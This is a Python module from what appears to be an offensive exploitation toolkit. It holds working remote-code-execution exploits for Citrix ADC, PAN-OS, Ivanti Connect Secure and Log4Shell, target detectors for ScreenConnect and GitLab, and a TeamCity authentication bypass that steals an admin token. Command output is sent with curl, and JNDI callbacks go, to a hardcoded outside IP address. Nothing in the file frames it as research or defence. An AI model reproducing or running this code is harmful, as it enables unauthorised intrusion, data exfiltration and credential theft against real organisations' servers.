"""Dicke Vektoren: Citrix 19781, PAN-OS 3400, Ivanti 46805/21887, Log4Shell, ScreenConnect, GitLab, TeamCity."""
from __future__ import annotations
import base64
import json
import secrets
import time

from .exploit import RunResult

JUMP = "http://5.230.41.44:9090"
LAST = {}


def _tok():
    return secrets.token_hex(5)


def _fetch(tok):
    import requests, urllib3
    urllib3.disable_warnings()
    try:
        r = requests.get(f"{JUMP}/x/{tok}", timeout=8)
        return r.text
    except Exception:
        return ""


class Blind:
    def __init__(self, name):
        self.name = name

    def run(self, target, cmd, timeout=None, audit=None):
        if not hasattr(target, "url"):
            class _T: pass
            _t = _T(); _t.url = target; target = _t
        if audit:
            audit.write(self.name, "cmd", getattr(target, "url", str(target)), cmd=cmd)
        tok = _tok()
        sh = f"{cmd} 2>&1 | curl -s -m 8 --data-binary @- {JUMP}/x/{tok}"
        try:
            self.exec(target, sh, tok)
        except Exception as e:
            if audit:
                audit.write("vector", "rce_fail", getattr(target, "url", str(target)),
                            vector=self.name, cmd=cmd, error=type(e).__name__)
            return RunResult(False, "", type(e).__name__, 3)
        out = ""
        for _ in range(5):
            time.sleep(1.2)
            out = _fetch(tok)
            if out.strip():
                break
        if audit:
            audit.write("vector", "rce_ok" if out.strip() else "rce_fail",
                        getattr(target, "url", str(target)), vector=self.name,
                        cmd=cmd, head=out[:200])
        return RunResult(True, out)

    def proof(self, target, token, timeout=None, audit=None):
        return token in self.run(target, f"echo {token}", audit=audit).stdout

    def exec(self, target, sh, tok):
        raise NotImplementedError


# ---------------- Citrix ADC CVE-2019-19781 (blind via Template-Toolkit)
class Citrix(Blind):
    def detect(self, t):
        try:
            import requests, urllib3
            urllib3.disable_warnings()
            r = requests.get(t.url + "/vpn/../vpns/portal/scripts/newbm.pl", timeout=8, verify=False)
            blob = r.text.lower() + str(r.headers).lower()
            if r.status_code == 401 and "citrix" in blob:
                return True
            return r.status_code in (200, 403) and ("citrix" in blob or "netscaler" in blob or "nsc_" in blob)
        except Exception:
            return False

    def exec(self, t, sh, tok):
        import requests, urllib3
        urllib3.disable_warnings()
        name = "dw" + tok + ".xml"
        desc = "[% template.new({'BLOCK' => 'x'}, '`" + sh + "`').process %]"
        requests.post(t.url + "/vpn/../vpns/portal/scripts/newbm.pl",
                      data={"url": "http://x/", "title": "x", "desc": desc, "name": name},
                      timeout=12, verify=False)
        requests.get(t.url + "/vpn/../vpns/portal/" + name, timeout=12, verify=False)


# ---------------- PAN-OS CVE-2024-3400
class Panos(Blind):
    def detect(self, t):
        try:
            import requests, urllib3
            urllib3.disable_warnings()
            r = requests.get(t.url + "/global-protect/login.esp", timeout=8, verify=False)
            return r.status_code == 200 and "global-protect" in r.text.lower()
        except Exception:
            return False

    def exec(self, t, sh, tok):
        import requests, urllib3
        urllib3.disable_warnings()
        name = "dw" + tok + ".txt"
        cookie = {"SESSID": f"/../../../../var/appweb/sslvpndocs/global-protect/portal/images/{name}"}
        requests.post(t.url + "/ssl-vpn/hipreport.esp", data=f"$({sh})",
                      cookies=cookie, timeout=12, verify=False)
        requests.get(t.url + "/global-protect/portal/images/" + name, timeout=12, verify=False)


# ---------------- Ivanti Connect Secure 46805/21887
class Ivanti(Blind):
    def detect(self, t):
        try:
            import requests, urllib3
            urllib3.disable_warnings()
            r = requests.get(t.url + "/api/v1/totp/user-backup-code/../../system/version", timeout=8, verify=False)
            blob = (r.text + str(r.headers)).lower()
            return r.status_code in (200, 401) and ("ivanti" in blob or "pulse" in blob or "dsid" in blob or "version" in blob)
        except Exception:
            return False

    def exec(self, t, sh, tok):
        import requests, urllib3, urllib.parse
        urllib3.disable_warnings()
        cmd = urllib.parse.quote(f";{sh}")
        requests.get(t.url + "/api/v1/totp/user-backup-code/../../license/keys-status/" + cmd,
                     timeout=12, verify=False)


# ---------------- Log4Shell (LDAP callback detection)
def log4j_detect(t):
    tok = _tok()
    try:
        import requests, urllib3
        urllib3.disable_warnings()
        s = requests.Session()
        s.verify = False
        j = "${jndi:ldap://5.230.41.44:1389/" + tok + "}"
        for h in ("User-Agent", "X-Api-Version", "Referer", "X-Forwarded-For"):
            try:
                s.get(t.url + "/", headers={h: j}, timeout=6)
            except Exception:
                pass
        time.sleep(2.5)
        try:
            return tok in open("/var/lib/dw/log4j.log").read()
        except FileNotFoundError:
            return False
    except Exception:
        return False


def log4j_open(t, audit):
    tok = _tok()
    try:
        import requests, urllib3
        urllib3.disable_warnings()
        j = "${jndi:ldap://5.230.41.44:1389/" + tok + "}"
        for h in ("User-Agent", "X-Api-Version", "Referer"):
            try:
                requests.get(t.url + "/", headers={h: j}, timeout=6, verify=False)
            except Exception:
                pass
        time.sleep(2)
        if tok in open("/var/lib/dw/log4j.log").read():
            audit.write("vector", "log4shell", t.url)
    except Exception:
        pass
    return None


# ---------------- ScreenConnect 2024-1709 (Bypass + User-Check)
def sc_detect(t):
    try:
        import requests, urllib3
        urllib3.disable_warnings()
        r = requests.get(t.url + "/", timeout=8, verify=False)
        blob = (r.text + json.dumps(dict(r.headers))).lower()
        return "screenconnect" in blob or "connectwise" in blob
    except Exception:
        return False


# ---------------- GitLab 2021-22205 (ExifTool / DjVu)
GITLAB_DJVU = None


def gl_detect(t):
    try:
        import requests, urllib3
        urllib3.disable_warnings()
        r = requests.get(t.url + "/users/sign_in", timeout=8, verify=False)
        return r.status_code == 200 and ("gitlab" in r.text.lower() or "gitlab" in (r.headers.get("server", "")).lower())
    except Exception:
        return False


# ---------------- TeamCity 2023-42793 (Token-Bypass, Creds)
def tc_detect(t):
    try:
        import requests, urllib3
        urllib3.disable_warnings()
        r = requests.get(t.url + "/mnt/", timeout=8, verify=False)
        return "teamcity" in r.text.lower() or "teamcity" in (r.headers.get("server", "")).lower()
    except Exception:
        return False


def tc_open(t, audit):
    import requests, urllib3
    urllib3.disable_warnings()
    s = requests.Session()
    s.verify = False
    try:
        r = s.post(t.url + "/app/rest/users/id:1/tokens/RPC2?%3F", timeout=12)
        tok = r.text.strip()
    except Exception:
        return None
    if not tok.startswith("<") and len(tok) > 10:
        audit.write("vector", "creds", t.url, vector="teamcity", secret=tok[:80])
    return None


VECTORS = [
    ("citrix", Citrix("citrix").detect, lambda t, a: Citrix("citrix")),
    ("panos", Panos("panos").detect, lambda t, a: Panos("panos")),
    ("ivanti", Ivanti("ivanti").detect, lambda t, a: Ivanti("ivanti")),
    ("log4j", log4j_detect, lambda t, a: None),
    ("screenconnect", sc_detect, lambda t, a: None),
    ("gitlab", gl_detect, lambda t, a: None),
    ("teamcity", tc_detect, tc_open),
]
